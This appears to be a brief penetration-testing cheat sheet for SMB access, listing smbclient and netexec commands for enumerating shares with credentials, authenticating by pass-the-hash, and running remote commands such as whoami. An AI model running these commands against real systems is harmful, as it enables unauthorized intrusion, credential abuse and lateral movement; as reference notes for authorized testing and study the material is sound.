# Access

## With credentials

```sh
smbclient -U "$user%$pass" -L //$target/
```

```sh
netexec smb $target --shares -u "$user" -p "$pass"
```

## Pass the hash

```sh
netexec smb $target -u "$user" -d . -H "$hash"
```

## RCE

```sh
netexec smb $target --shares -u "$user" -p "$pass" -x whoami
```

